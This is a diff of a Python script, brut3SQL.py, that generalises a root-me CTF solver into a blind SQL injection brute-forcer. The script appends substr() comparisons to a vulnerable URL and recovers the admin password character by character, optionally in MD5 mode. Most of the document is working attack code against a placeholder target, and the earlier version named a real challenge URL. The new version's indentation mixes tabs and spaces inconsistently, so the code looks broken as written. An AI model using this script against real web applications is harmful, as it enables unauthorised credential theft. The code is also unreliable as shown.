@@ -1,46 +1,86 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+###########################################################
+#              brut3SQL.py 0.1 / ky0p - 2014              #
+###########################################################
+# Brute-force an sql account login/password               #
+###########################################################
+
+import sys
+import argparse
 import requests
 import re
 
-cookies=dict(spip_session='XX', PHPSESSID='XX')
+#if cookies are required:
+#cookies=dict(COOKIE_01='',COOKIE_02='XX')
+#else
+cookies=""
+
+#if Basic Digest Authentication is required
 #auth=HTTPBasicAuth('user', 'pass'))
+#else
 auth=""
-found=0
-length=1
-longueur=40
-#Debut du code ascii a tester : 48 a 126 pour la table ascii basique / 48 a 57 puis 97 a 102 pour MD5
-current_car=48
-ascii_end=126
-final_pass=""
-#Le mot de passe est-il en md5 ?
-md5=1
-print "[>>] Brute-force in progress..."
+	
+#ASCII code for regular BF:
+#Start = 32 -> Space
+#End  = 126 -> ~
+
+#ASCII code for MD5 BF:
+#Start = 48 -> 0
+#End   = 57 -> 9
+#then
+#97  -> a
+#102 -> f
+
+currentCar=32 # Regular BF Start (32 -> Space)
+asciiEnd=126 # Regular BF End (126 -> ~)
+totalLenght=40 #We assume the password is about 40 bytes long
+
+#If the password is a MD5 hash, makes the BF run faster
+md5=0 #Boolean, 0 is off, 1 is on
+found=0 #Password not found yet at this state
+currentLenght=1 #We start by the first letter
+targetUrl="http://target.com/sqlinjection/vulnerable.php&id=1" #URL of the target
+failAccess="no such user" #What to search for in case the request succeed but no matches found
+finalPass="" #Our final pass will be here
+
+print u"[>>] Starting brut3SQL..."
 
 if (md5==1):
-	print "[>>] Using MD5 mode..."
-	longueur=32
-	ascii_end=103
-	
-while(found==0 and current_car<ascii_end):
-	if (md5==1 and current_car==58):
-		current_car=current_car+39
-	if (current_car==95):
-		current_car+=1
-	url="http://challenge01.root-me.org//realiste/ch8/?id=6&action=view&uid=1 and login=\"admin\" and substr(pass,"+str(length)+",1"+")=\""+str(chr(current_car))+"\""
-	#result=requests.get(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth).content
-	payload = {'login': 'tutu', 'password': 'tata'}
-	result=requests.post(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth, datapayload).content
-	res=re.search("no such user", result)
-	if res is None:
-		if (length!=longueur):
-			print "["+str(length)+"/"+str(longueur)+"] " + final_pass
-			final_pass+=chr(current_car)
-			length+=1
-			current_car=48
-		else:
-			final_pass+=chr(current_car)
-			found=1
+    print u"[>>] Using MD5 mode..."
+	    currentCar=48 # MD5 BF Start (48 -> 0)
+	    asciiEnd=102 # MD5 BF End (102 -> f)
+		totalLenght=32 #MD5's 32 bytes long
 
-	else:
-		current_car+=1
+while(found==0 and currentCar<asciiEnd):
+	  if (md5==1 and currentCar==58):
+		  currentCar=currentCar+39 #We jump to 97 -> a
+	  if (currentCar==95): #95 -> _ , we don't want this
+		  currentCar+=1
+	  url=targetUrl+" and login=\"admin\" and substr(pass,"+str(currentLenght)+",1"+")=\""+str(chr(currentCar))+"\""
+	  #if the request is GET
+	  #result=requests.get(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth).content
+	  #if the request is POST
+	  payload = {'login': 'foo', 'password': 'bar'} #POST variables
+	  result=requests.post(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth, data=payload).content
+	  res=re.search("no such user", result)
+	  if res is None: #No errors, the letter's good
+		  if (currentLenght!=totalLenght): #Until we're finished...
+			  print "["+str(currentLenght)+"/"+str(totalLenght)+"] " + finalPass #We show progress, comment this to go faster
+			  finalPass+=chr(currentCar)
+			  currentLenght+=1
+			  #We start over
+			  if (md5==1):
+			      currentCar=48 #48 -> 0
+			  else:
+			      currentCar=32 #32 -> Space
+		  else:
+              finalPass+=chr(currentCar)
+              found=1
+	  else:
+          currentCar+=1 #This letter's bad, we continue
 
-print ("[\o/] Flag : %s " % final_pass)
+print (u"[\o/] Pass found : %s " % finalPass)
+
+sys.exit(0)
